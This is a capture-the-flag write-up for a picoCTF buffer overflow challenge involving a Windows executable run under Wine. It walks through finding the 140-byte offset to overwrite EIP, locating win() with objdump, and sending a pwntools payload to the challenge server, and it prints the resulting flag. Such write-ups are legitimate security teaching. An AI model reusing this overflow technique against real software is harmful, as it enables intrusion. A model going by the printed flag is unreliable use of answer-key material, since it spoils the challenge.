# Stack Cache - 400 pts

### Key points

- Buffer Overflow

---

## **Contents**

- [Overview](#overview)
- [Solution](#solution)
- [Flag](#the-flag)

---

## Overview

### Description

> Challenge best paired with wine. I love windows. Checkout my exe running on a linux box. You can view source here. And connect with it using nc saturn.picoctf.net 61889

We are given a binary and its source code.

---

## Solution

Upon opening `vuln.c`, we see that the source code is very _very_ similar to the other buffer overflow challenges. The only difference being it is a Windows executable. You will find the solution is basically the same too.

Here's a quick breakdown of the source code:

`main()` calls `vuln()`

`vuln()` reads an input of buffer size 128 via `gets()`

`win()` opens and reads a file `flag.txt` and prints it, but `win()` is never called.

As with the basic buffer overflow challenges, we simply have to find the offset of the return instruction, and overwrite it with the address of `win()`.

---

### **Wine**

Wine (Wine Is Not an Emulator) is tool that allows Windows executables to be run on other operating systems, such as macOS and Linux.

If you don't have Wine, you can install it with

```ps1
$ sudo apt install wine64
```

or

```ps1
$ sudo apt install wine32
```

if you are running on a 32-bit operating system.

After installing, we can run the binary:

```ps1
$ wine vuln.exe
Give me a string!
flag pls
```

...and it exits.

The buffer size is 128, so lets enter a little more than 128 bytes:

```ps1
$ wine vuln.exe
Give me a string!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggghhhh
wine: Unhandled page fault on read access to 65656565 at address 65656565 (thread 0009), starting debugger...
002c:err:winediag:nodrv_CreateWindow Application tried to create a window, but no driver could be loaded.
002c:err:winediag:nodrv_CreateWindow Make sure that your X server is running and that $DISPLAY is set correctly.
Unhandled exception: page fault on read access to 0x65656565 in 32-bit code (0x65656565).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:65656565 ESP:0064fe80 EBP:64646464 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0064fdf0 EBX:00230e74 ECX:0064fde0 EDX:7fa4a8d8
 ESI:0000001c EDI:0021ffc4
 ...
```

Looks like we succesfully overwrote the `eip` register with `0x65656565` (`'eeee'`). So we need to enter 140 bytes, then the address of `win()`.

Let's find the address of `win()` using objdump:

```ps1
$ objdump -d vuln.exe | grep "win"
00401530 <_win>:
  401551:       75 18                   jne    40156b <_win+0x3b>
```

The address is `0x00401530`. Scripting time!

Send our payload to the remote server: (this specific challenge remote may take around 10 seconds to return a value because it needs to start Wine)

```py
from pwn import *

payload = 140*b"a" + p32(0x00401530)

r = remote("saturn.picoctf.net", "61889")
r.sendline(payload)
result = str(r.recvall())
r.close()
```

Then parse the result and print our flag:

```py
FLAG = result[result.index("picoCTF"):result.index("}") + 1]
print("Flag:", FLAG)
```

---

## Flag

> `picoCTF{Un_v3rr3_d3_v1n_cdac4d01}`

That's French for "A glass of wine", by the way.
